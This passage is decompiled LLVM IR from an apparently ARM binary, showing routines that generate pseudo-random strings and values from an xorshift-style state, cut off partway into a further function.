  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-73 = alloca i32, align 4
  store i32 %arg2, i32* %r7.global-to-local, align 4
  store i32 %tmp, i32* %r8.global-to-local, align 4
  store i32 ptrtoint ([33 x i8]* @global_var_15a78.151 to i32), i32* @r1, align 4
  %v2_e8b4 = ptrtoint i32* %stack_var_-73 to i32
  store i32 %v2_e8b4, i32* @r0, align 4
  store i32 33, i32* @r2, align 4
  %v0_e8bc = call i32 @function_10b30()
  store i32 %v0_e8bc, i32* %r0.global-to-local, align 4
  %v0_e8c0 = load i32, i32* %r7.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_e8c0 = icmp slt i32 %v0_e8c0, 0
  store i1 %v1_e8c0, i1* %cpsr_n.global-to-local, align 1
  %v2_e8c0 = icmp eq i32 %v0_e8c0, 0
  store i1 %v2_e8c0, i1* %cpsr_z.global-to-local, align 1
  %tmp24 = icmp slt i32 %v0_e8c0, 1
  br i1 %tmp24, label %dec_label_pc_e9b8, label %dec_label_pc_e8c8

dec_label_pc_e8c8:                                ; preds = %dec_label_pc_e8a0
  store i32 ptrtoint (i32* @global_var_1e5cc.141 to i32), i32* %fp.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1e5c8.145 to i32), i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1e5c4.143 to i32), i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1e5c0.139 to i32), i32* %r3.global-to-local, align 4
  %v2_e8d8 = load i32, i32* @global_var_1e5cc.141, align 4
  store i32 %v2_e8d8, i32* %r5.global-to-local, align 4
  %v2_e8dc = load i32, i32* @global_var_1e5c8.145, align 4
  store i32 %v2_e8dc, i32* %sb.global-to-local, align 4
  %v2_e8e0 = load i32, i32* @global_var_1e5c4.143, align 4
  store i32 %v2_e8e0, i32* %sl.global-to-local, align 4
  %v2_e8e4 = load i32, i32* @global_var_1e5c0.139, align 4
  store i32 %v2_e8e4, i32* %r0.global-to-local, align 4
  %v2_e8f0 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_e954

dec_label_pc_e8ec:                                ; preds = %dec_label_pc_e954
  %v1_e8ec = urem i32 %v5_e964, 256
  store i32 %v1_e8ec, i32* %r3.global-to-local, align 4
  store i32 %v2_e8f0, i32* %r1.global-to-local, align 4
  %v4_e8f4 = udiv i32 %v1_e8ec, 8
  %v5_e8f4 = add i32 %v4_e8f4, %v2_e8f0
  store i32 %v5_e8f4, i32* %r2.global-to-local, align 4
  %v1_e8f8 = add i32 %v5_e8f4, -33
  %v2_e8f8 = inttoptr i32 %v1_e8f8 to i8*
  %v3_e8f8 = load i8, i8* %v2_e8f8, align 1
  %v4_e8f8 = zext i8 %v3_e8f8 to i32
  store i32 %v4_e8f8, i32* %r0.global-to-local, align 4
  %v3_e8fc = mul i32 %v5_e964, 65536
  store i32 %v3_e8fc, i32* %r1.global-to-local, align 4
  store i32 %v2_e8f0, i32* %r2.global-to-local, align 4
  %tmp25 = udiv i32 %v5_e964, 2048
  %v4_e904 = urem i32 %tmp25, 32
  %v5_e904 = add i32 %v4_e904, %v2_e8f0
  store i32 %v5_e904, i32* %r3.global-to-local, align 4
  %v1_e908 = add i32 %v5_e904, -33
  %v2_e908 = inttoptr i32 %v1_e908 to i8*
  %v3_e908 = load i8, i8* %v2_e908, align 1
  %v4_e908 = zext i8 %v3_e908 to i32
  store i32 %v4_e908, i32* %ip.global-to-local, align 4
  %v3_e90c = mul i32 %v5_e964, 256
  store i32 %v3_e90c, i32* %r2.global-to-local, align 4
  %v3_e910 = inttoptr i32 %v0_e968 to i8*
  store i8 %v3_e8f8, i8* %v3_e910, align 1
  %v4_e910 = load i32, i32* %r6.global-to-local, align 4
  %v5_e910 = add i32 %v4_e910, 1
  store i32 %v5_e910, i32* %r6.global-to-local, align 4
  %v1_e918 = load i32, i32* %r2.global-to-local, align 4
  %v4_e918 = udiv i32 %v1_e918, 134217728
  %v5_e918 = add i32 %v4_e918, %v2_e8f0
  store i32 %v5_e918, i32* %r1.global-to-local, align 4
  %v1_e91c = load i32, i32* %r4.global-to-local, align 4
  %v4_e91c = udiv i32 %v1_e91c, 134217728
  %v5_e91c = add i32 %v4_e91c, %v2_e8f0
  store i32 %v5_e91c, i32* %r3.global-to-local, align 4
  %v1_e920 = add i32 %v5_e918, -33
  %v2_e920 = inttoptr i32 %v1_e920 to i8*
  %v3_e920 = load i8, i8* %v2_e920, align 1
  %v4_e920 = zext i8 %v3_e920 to i32
  store i32 %v4_e920, i32* %lr.global-to-local, align 4
  %v1_e924 = add i32 %v5_e91c, -33
  %v2_e924 = inttoptr i32 %v1_e924 to i8*
  %v3_e924 = load i8, i8* %v2_e924, align 1
  %v4_e924 = zext i8 %v3_e924 to i32
  store i32 %v4_e924, i32* %r2.global-to-local, align 4
  %v0_e928 = load i32, i32* %r7.global-to-local, align 4
  %v1_e928 = add i32 %v0_e928, -4
  store i32 %v1_e928, i32* %r7.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_e92c = icmp slt i32 %v1_e928, 0
  store i1 %v1_e92c, i1* %cpsr_n.global-to-local, align 1
  %v2_e92c = icmp eq i32 %v1_e928, 0
  store i1 %v2_e92c, i1* %cpsr_z.global-to-local, align 1
  %v0_e930 = load i32, i32* %ip.global-to-local, align 4
  %v1_e930 = trunc i32 %v0_e930 to i8
  %v2_e930 = load i32, i32* %r8.global-to-local, align 4
  %v3_e930 = add i32 %v2_e930, 1
  %v4_e930 = inttoptr i32 %v3_e930 to i8*
  store i8 %v1_e930, i8* %v4_e930, align 1
  %v0_e934 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_e934, i32* %r0.global-to-local, align 4
  %v0_e938 = load i32, i32* %r8.global-to-local, align 4
  %v1_e938 = add i32 %v0_e938, 4
  store i32 %v1_e938, i32* %r8.global-to-local, align 4
  %v0_e93c = load i32, i32* %r2.global-to-local, align 4
  %v1_e93c = trunc i32 %v0_e93c to i8
  %v2_e93c = load i32, i32* %r6.global-to-local, align 4
  %v3_e93c = add i32 %v2_e93c, 2
  %v4_e93c = inttoptr i32 %v3_e93c to i8*
  store i8 %v1_e93c, i8* %v4_e93c, align 1
  %v0_e940 = load i32, i32* %lr.global-to-local, align 4
  %v1_e940 = trunc i32 %v0_e940 to i8
  %v2_e940 = load i32, i32* %r6.global-to-local, align 4
  %v3_e940 = add i32 %v2_e940, 1
  %v4_e940 = inttoptr i32 %v3_e940 to i8*
  store i8 %v1_e940, i8* %v4_e940, align 1
  %v0_e944 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_e944 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_e944 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v3_e944 = xor i1 %v1_e944, %v2_e944
  %v4_e944 = or i1 %v0_e944, %v3_e944
  br i1 %v4_e944, label %dec_label_pc_e99c, label %dec_label_pc_e8ec.dec_label_pc_e948_crit_edge

dec_label_pc_e8ec.dec_label_pc_e948_crit_edge:    ; preds = %dec_label_pc_e8ec
  %v0_e954.pre.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e948

dec_label_pc_e948:                                ; preds = %dec_label_pc_e8ec.dec_label_pc_e948_crit_edge, %dec_label_pc_e970
  %v0_e954.pre = phi i32 [ %v0_e954.pre.pre, %dec_label_pc_e8ec.dec_label_pc_e948_crit_edge ], [ %v0_e994, %dec_label_pc_e970 ]
  %v0_e948 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_e948, i32* %sl.global-to-local, align 4
  %v0_e94c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_e94c, i32* %sb.global-to-local, align 4
  %v0_e950 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_e950, i32* %r5.global-to-local, align 4
  %v0_e960.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_e954

dec_label_pc_e954:                                ; preds = %dec_label_pc_e8c8, %dec_label_pc_e948
  %v0_e984 = phi i32 [ %v0_e8c0, %dec_label_pc_e8c8 ], [ %v0_e960.pre, %dec_label_pc_e948 ]
  %v0_e958 = phi i32 [ %v2_e8d8, %dec_label_pc_e8c8 ], [ %v0_e950, %dec_label_pc_e948 ]
  %v0_e954 = phi i32 [ %v2_e8e4, %dec_label_pc_e8c8 ], [ %v0_e954.pre, %dec_label_pc_e948 ]
  %v4_e954 = mul i32 %v0_e954, 2048
  %v5_e954 = xor i32 %v4_e954, %v0_e954
  store i32 %v5_e954, i32* %r3.global-to-local, align 4
  %v4_e958 = udiv i32 %v0_e958, 524288
  %v5_e958 = xor i32 %v4_e958, %v0_e958
  %v2_e95c = xor i32 %v5_e958, %v5_e954
  store i32 %v2_e95c, i32* %r2.global-to-local, align 4
  %v1_e960 = add i32 %v0_e984, -3
  %v3_e960 = sub i32 2, %v0_e984
  %v4_e960 = and i32 %v3_e960, %v0_e984
  %v5_e960 = icmp slt i32 %v4_e960, 0
  store i1 %v5_e960, i1* %cpsr_v.global-to-local, align 1
  %v6_e960 = icmp slt i32 %v1_e960, 0
  store i1 %v6_e960, i1* %cpsr_n.global-to-local, align 1
  %v7_e960 = icmp eq i32 %v0_e984, 3
  store i1 %v7_e960, i1* %cpsr_z.global-to-local, align 1
  %v2_e964 = and i32 %v0_e954, 128
  %v3_e964 = icmp ne i32 %v2_e964, 0
  %v4_e964 = udiv i32 %v5_e954, 256
  %v5_e964 = xor i32 %v4_e964, %v2_e95c
  store i32 %v5_e964, i32* %r4.global-to-local, align 4
  %v0_e968 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_e968, i32* %r6.global-to-local, align 4
  %v2_e96c = xor i1 %v7_e960, true
  %v3_e96c = and i1 %v3_e964, %v2_e96c
  br i1 %v3_e96c, label %dec_label_pc_e8ec, label %dec_label_pc_e970

dec_label_pc_e970:                                ; preds = %dec_label_pc_e954
  %v1_e984 = add i32 %v0_e984, -1
  store i32 %v1_e984, i32* %r7.global-to-local, align 4
  %v2_e980.neg = urem i32 %v5_e964, 33
  store i32 %v2_e980.neg, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_e98c = icmp slt i32 %v1_e984, 0
  store i1 %v1_e98c, i1* %cpsr_n.global-to-local, align 1
  %v2_e98c = icmp eq i32 %v1_e984, 0
  store i1 %v2_e98c, i1* %cpsr_z.global-to-local, align 1
  %v1_e990 = trunc i32 %v2_e980.neg to i8
  %v3_e990 = inttoptr i32 %v0_e968 to i8*
  store i8 %v1_e990, i8* %v3_e990, align 1
  %v4_e990 = load i32, i32* %r8.global-to-local, align 4
  %v5_e990 = add i32 %v4_e990, 1
  store i32 %v5_e990, i32* %r8.global-to-local, align 4
  %v0_e994 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_e994, i32* %r0.global-to-local, align 4
  %v0_e998 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_e998 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_e998 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v3_e998 = xor i1 %v1_e998, %v2_e998
  %v4_e998 = or i1 %v0_e998, %v3_e998
  br i1 %v4_e998, label %dec_label_pc_e99c, label %dec_label_pc_e948

dec_label_pc_e99c:                                ; preds = %dec_label_pc_e970, %dec_label_pc_e8ec
  store i32 ptrtoint (i32* @global_var_1e5c8.145 to i32), i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1e5c4.143 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1e5c0.139 to i32), i32* %r1.global-to-local, align 4
  %v0_e9a8 = load i32, i32* %r4.global-to-local, align 4
  %v1_e9a8 = load i32, i32* %fp.global-to-local, align 4
  %v2_e9a8 = inttoptr i32 %v1_e9a8 to i32*
  store i32 %v0_e9a8, i32* %v2_e9a8, align 4
  %v0_e9ac = load i32, i32* %r5.global-to-local, align 4
  %v1_e9ac = load i32, i32* %r2.global-to-local, align 4
  %v2_e9ac = inttoptr i32 %v1_e9ac to i32*
  store i32 %v0_e9ac, i32* %v2_e9ac, align 4
  %v0_e9b0 = load i32, i32* %sb.global-to-local, align 4
  %v1_e9b0 = load i32, i32* %r3.global-to-local, align 4
  %v2_e9b0 = inttoptr i32 %v1_e9b0 to i32*
  store i32 %v0_e9b0, i32* %v2_e9b0, align 4
  %v0_e9b4 = load i32, i32* %sl.global-to-local, align 4
  %v1_e9b4 = load i32, i32* %r1.global-to-local, align 4
  %v2_e9b4 = inttoptr i32 %v1_e9b4 to i32*
  store i32 %v0_e9b4, i32* %v2_e9b4, align 4
  %v1_e9c0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e9b8

dec_label_pc_e9b8:                                ; preds = %dec_label_pc_e8a0, %dec_label_pc_e99c
  %v1_e9c0 = phi i32 [ %v0_e8bc, %dec_label_pc_e8a0 ], [ %v1_e9c0.pre, %dec_label_pc_e99c ]
  ret i32 %v1_e9c0

; uselistorder directives
  uselistorder i32 %v0_e994, { 1, 0 }
  uselistorder i32 %v2_e980.neg, { 1, 0 }
  uselistorder i32 %v0_e968, { 1, 2, 0 }
  uselistorder i32 %v5_e964, { 0, 5, 4, 2, 3, 1 }
  uselistorder i32 %v0_e954, { 2, 1, 0 }
  uselistorder i32 %v0_e958, { 1, 0 }
  uselistorder i32 %v0_e984, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v2_e8f0, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_e8c0, { 0, 1, 3, 2 }
  uselistorder i32* %sl.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 5, 1, 3, 4, 6 }
  uselistorder i32* %r6.global-to-local, { 4, 0, 1, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r4.global-to-local, { 0, 3, 1, 2 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 8, 2, 3, 4, 5, 6, 7, 9 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 4, 5, 6, 7, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i1* %cpsr_v.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i1* %cpsr_n.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder label %dec_label_pc_e9b8, { 1, 0 }
  uselistorder label %dec_label_pc_e954, { 1, 0 }
  uselistorder label %dec_label_pc_e948, { 1, 0 }
}

define i32 @function_e9dc(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_e9dc:
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_e9dc = load i32, i32* %r1.global-to-local, align 4
  %v3_e9e0 = load i32, i32* @r4, align 4
  store i32 %v3_e9e0, i32* %stack_var_-28, align 4
  %v0_e9e4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_e9e4, i32* %r5.global-to-local, align 4
  %tmp16 = icmp slt i32 %v0_e9dc, 1
  br i1 %tmp16, label %dec_label_pc_ea8c, label %dec_label_pc_e9ec

dec_label_pc_e9ec:                                ; preds = %dec_label_pc_e9dc
  store i32 ptrtoint (i32* @global_var_1e5cc.141 to i32), i32* %sl.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1e5c8.145 to i32), i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1e5c4.143 to i32), i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1e5c0.139 to i32), i32* %r6.global-to-local, align 4
  %v2_e9fc = load i32, i32* @global_var_1e5cc.141, align 4
  store i32 %v2_e9fc, i32* %lr.global-to-local, align 4
  %v2_ea00 = load i32, i32* @global_var_1e5c8.145, align 4
  store i32 %v2_ea00, i32* %r4.global-to-local, align 4
  %v2_ea04 = load i32, i32* @global_var_1e5c4.143, align 4
  store i32 %v2_ea04, i32* %r0.global-to-local, align 4
  %v2_ea08 = load i32, i32* @global_var_1e5c0.139, align 4
  br label %dec_label_pc_ea2c

dec_label_pc_ea10:                                ; preds = %dec_label_pc_ea4c
  %v1_ea10 = trunc i32 %v5_ea3c to i16
  %v3_ea10 = inttoptr i32 %v9_ea40 to i16*
  store i16 %v1_ea10, i16* %v3_ea10, align 2
  %v4_ea10 = load i32, i32* %r5.global-to-local, align 4
  %v5_ea10 = add i32 %v4_ea10, -2
  store i32 %v5_ea10, i32* %r5.global-to-local, align 4
  %v0_ea14.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_ea14

dec_label_pc_ea14:                                ; preds = %.thread, %dec_label_pc_ea10
  %v0_ea14 = phi i32 [ %v9_ea44, %.thread ], [ %v0_ea14.pre, %dec_label_pc_ea10 ]
  %v2_ea105 = phi i32 [ %v12_ea40, %.thread ], [ %v5_ea10, %dec_label_pc_ea10 ]
  %tmp17 = icmp slt i32 %v0_ea14, 1
  br i1 %tmp17, label %dec_label_pc_ea94, label %dec_label_pc_ea20

dec_label_pc_ea20:                                ; preds = %dec_label_pc_ea14
  %v0_ea18 = load i32, i32* %r0.global-to-local, align 4
  %v0_ea20 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_ea20, i32* %r0.global-to-local, align 4
  %v0_ea24 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v0_ea24, i32* %r4.global-to-local, align 4
  %v0_ea28 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_ea28, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_ea2c

dec_label_pc_ea2c:                                ; preds = %dec_label_pc_e9ec, %dec_label_pc_ea20
  %v0_ea78 = phi i32 [ %v2_ea04, %dec_label_pc_e9ec ], [ %v0_ea20, %dec_label_pc_ea20 ]
  %v9_ea40 = phi i32 [ %v0_e9e4, %dec_label_pc_e9ec ], [ %v2_ea105, %dec_label_pc_ea20 ]
  %v0_ea58 = phi i32 [ %v0_e9dc, %dec_label_pc_e9ec ], [ %v0_ea14, %dec_label_pc_ea20 ]
  %v0_ea6c = phi i32 [ %v2_e9fc, %dec_label_pc_e9ec ], [ %v0_ea28, %dec_label_pc_ea20 ]
  %v0_ea68 = phi i32 [ %v2_ea08, %dec_label_pc_e9ec ], [ %v0_ea18, %dec_label_pc_ea20 ]
  %v4_ea2c = mul i32 %v0_ea68, 2048
  %v5_ea2c = xor i32 %v4_ea2c, %v0_ea68
  %v4_ea30 = udiv i32 %v0_ea6c, 524288
  %v5_ea30 = xor i32 %v4_ea30, %v0_ea6c
  %v2_ea34 = xor i32 %v5_ea30, %v5_ea2c
  %v4_ea3c = udiv i32 %v5_ea2c, 256
  %v5_ea3c = xor i32 %v2_ea34, %v4_ea3c
  store i32 %v5_ea3c, i32* %r3.global-to-local, align 4
  %v7_ea40 = icmp sgt i32 %v0_ea58, 3
  br i1 %v7_ea40, label %.thread, label %dec_label_pc_ea4c

.thread:                                          ; preds = %dec_label_pc_ea2c
  %v10_ea40 = inttoptr i32 %v9_ea40 to i32*
  store i32 %v5_ea3c, i32* %v10_ea40, align 4
  %v11_ea40 = load i32, i32* %r5.global-to-local, align 4
  %v12_ea40 = add i32 %v11_ea40, 4
  store i32 %v12_ea40, i32* %r5.global-to-local, align 4
  %v8_ea44 = load i32, i32* %r1.global-to-local, align 4
  %v9_ea44 = add i32 %v8_ea44, -4
  store i32 %v9_ea44, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_ea14

dec_label_pc_ea4c:                                ; preds = %dec_label_pc_ea2c
  %v7_ea58 = icmp eq i32 %v0_ea58, 1
  store i32 %v5_ea3c, i32* %r3.global-to-local, align 4
  %v1_ea60 = add i32 %v0_ea58, -2
  store i32 %v1_ea60, i32* %r1.global-to-local, align 4
  br i1 %v7_ea58, label %dec_label_pc_ea68, label %dec_label_pc_ea10

dec_label_pc_ea68:                                ; preds = %dec_label_pc_ea4c
  store i32 %v5_ea3c, i32* %r3.global-to-local, align 4
  %v1_ea78 = load i32, i32* %r6.global-to-local, align 4
  %v2_ea78 = inttoptr i32 %v1_ea78 to i32*
  store i32 %v0_ea78, i32* %v2_ea78, align 4
  %v0_ea7c = load i32, i32* %r4.global-to-local, align 4
  %v1_ea7c = load i32, i32* %r7.global-to-local, align 4
  %v2_ea7c = inttoptr i32 %v1_ea7c to i32*
  store i32 %v0_ea7c, i32* %v2_ea7c, align 4
  %v0_ea80 = load i32, i32* %lr.global-to-local, align 4
  %v1_ea80 = load i32, i32* %r8.global-to-local, align 4
  %v2_ea80 = inttoptr i32 %v1_ea80 to i32*
  store i32 %v0_ea80, i32* %v2_ea80, align 4
  %v0_ea84 = load i32, i32* %r3.global-to-local, align 4
  %v1_ea84 = load i32, i32* %sl.global-to-local, align 4
  %v2_ea84 = inttoptr i32 %v1_ea84 to i32*
  store i32 %v0_ea84, i32* %v2_ea84, align 4
  %v0_ea88 = load i32, i32* %r3.global-to-local, align 4
  %v1_ea88 = trunc i32 %v0_ea88 to i8
  %v2_ea88 = load i32, i32* %r5.global-to-local, align 4
  %v3_ea88 = inttoptr i32 %v2_ea88 to i8*
  store i8 %v1_ea88, i8* %v3_ea88, align 1
  br label %dec_label_pc_ea8c

dec_label_pc_ea8c:                                ; preds = %dec_label_pc_e9dc, %dec_label_pc_ea94, %dec_label_pc_ea68
  %v2_ea8c = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_ea8c, i32* @r4, align 4
  %v1_ea90 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_ea90

dec_label_pc_ea94:                                ; preds = %dec_label_pc_ea14
  %v0_ea94 = load i32, i32* %r3.global-to-local, align 4
  %v1_ea94 = load i32, i32* %sl.global-to-local, align 4
  %v2_ea94 = inttoptr i32 %v1_ea94 to i32*
  store i32 %v0_ea94, i32* %v2_ea94, align 4
  %v0_ea98 = load i32, i32* %lr.global-to-local, align 4
  %v1_ea98 = load i32, i32* %r8.global-to-local, align 4
  %v2_ea98 = inttoptr i32 %v1_ea98 to i32*
  store i32 %v0_ea98, i32* %v2_ea98, align 4
  %v0_ea9c = load i32, i32* %r4.global-to-local, align 4
  %v1_ea9c = load i32, i32* %r7.global-to-local, align 4
  %v2_ea9c = inttoptr i32 %v1_ea9c to i32*
  store i32 %v0_ea9c, i32* %v2_ea9c, align 4
  %v0_eaa0 = load i32, i32* %r0.global-to-local, align 4
  %v1_eaa0 = load i32, i32* %r6.global-to-local, align 4
  %v2_eaa0 = inttoptr i32 %v1_eaa0 to i32*
  store i32 %v0_eaa0, i32* %v2_eaa0, align 4
  br label %dec_label_pc_ea8c

; uselistorder directives
  uselistorder i32 %v9_ea44, { 1, 0 }
  uselistorder i32 %v12_ea40, { 1, 0 }
  uselistorder i32 %v5_ea3c, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v0_ea68, { 1, 0 }
  uselistorder i32 %v0_ea6c, { 1, 0 }
  uselistorder i32 %v0_ea58, { 1, 0, 2 }
  uselistorder i32 %v0_ea14, { 1, 0 }
  uselistorder i32 %v0_e9dc, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 4, 0, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 4, 0, 1, 2, 3, 6, 5 }
  uselistorder i32* %r1.global-to-local, { 3, 5, 4, 2, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 4, 3, 2, 5, 6, 0, 1 }
  uselistorder i32* %lr.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* @global_var_1e5c0.139, { 2, 3, 5, 1, 0, 4 }
  uselistorder i32* @global_var_1e5c4.143, { 2, 3, 6, 4, 1, 0, 5 }
  uselistorder i32* @global_var_1e5c8.145, { 2, 3, 5, 1, 0, 4 }
  uselistorder i32* @global_var_1e5cc.141, { 2, 3, 5, 1, 0, 4 }
  uselistorder label %dec_label_pc_ea8c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ea2c, { 1, 0 }
}

define i32 @function_eab8(i32 %arg1) local_unnamed_addr {
dec_label_pc_eab8:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_eab8 = load i32, i32* @r4, align 4
  store i32 %v3_eab8, i32* %stack_var_-8, align 4
  %v0_eabc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_eabc, i32* @r4, align 4
  %v2_eabc = icmp eq i32 %v0_eabc, 0
  br i1 %v2_eabc, label %dec_label_pc_ead8, label %dec_label_pc_eac4

dec_label_pc_eac4:                                ; preds = %dec_label_pc_eab8
  %v1_eac4 = add i32 %v0_eabc, 4
  %v2_eac4 = inttoptr i32 %v1_eac4 to i32*
  %v3_eac4 = load i32, i32* %v2_eac4, align 4
  store i32 %v3_eac4, i32* %r0.global-to-local, align 4
  store i32 60112, i32* @lr, align 4
  %v1_eacc = icmp ne i32 %v3_eac4, 0
  call void @__pseudo_cond_branch(i1 %v1_eacc, i32 ptrtoint (i32* @global_var_120a4.55 to i32))
  %v0_ead0 = load i32, i32* @r4, align 4
  store i32 %v0_ead0, i32* @r0, align 4
  %v0_ead4 = call i32 @function_120a4()
  store i32 %v0_ead4, i32* %r0.global-to-local, align 4
  %v2_ead8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_ead8

dec_label_pc_ead8:                                ; preds = %dec_label_pc_eab8, %dec_label_pc_eac4
  %v1_eadc = phi i32 [ 0, %dec_label_pc_eab8 ], [ %v0_ead4, %dec_label_pc_eac4 ]
  %v2_ead8 = phi i32 [ %v3_eab8, %dec_label_pc_eab8 ], [ %v2_ead8.pre, %dec_label_pc_eac4 ]
  store i32 %v2_ead8, i32* @r4, align 4
  ret i32 %v1_eadc

; uselistorder directives
  uselistorder i32 %v0_eabc, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_ead8, { 1, 0 }
}

define i32 @function_eae0(i32 %arg1) local_unnamed_addr {
dec_label_pc_eae0:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp79 = call i16 @__decompiler_undefined_function_1()
  %stack_var_-4280 = alloca i32, align 4
  %stack_var_-4292 = alloca i16, align 2
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-2230 = alloca i32, align 4
  %stack_var_-2244 = alloca i16, align 2
  %stack_var_-2232 = alloca i32, align 4
  %v3_eae0 = load i32, i32* @r4, align 4
  %v9_eae0 = load i32, i32* @r6, align 4
  %v12_eae0 = load i32, i32* @r7, align 4
  %v27_eae0 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_eaf8 = call i32 @function_11958(i32 1, i32 8)
  store i32 %v2_eaf8, i32* @fp, align 4
  %v0_eb00 = load i32, i32* @r5, align 4
  store i32 %v0_eb00, i32* %r0.global-to-local, align 4
  %v1_eb04 = inttoptr i32 %v0_eb00 to i8*
  %v2_eb04 = call i32 @function_f93c(i8* %v1_eb04)
  %v2_eb0c = ptrtoint i16* %stack_var_-2244 to i32
  store i32 %v2_eb0c, i32* @sl, align 4
  %v2_eb10 = ptrtoint i32* %stack_var_-2232 to i32
  store i32 %v2_eb10, i32* @sb, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_eb18 = add i32 %v2_eb04, 1
  store i32 %v1_eb18, i32* %r0.global-to-local, align 4
  %v2_eb1c = ptrtoint i32* %stack_var_-2230 to i32
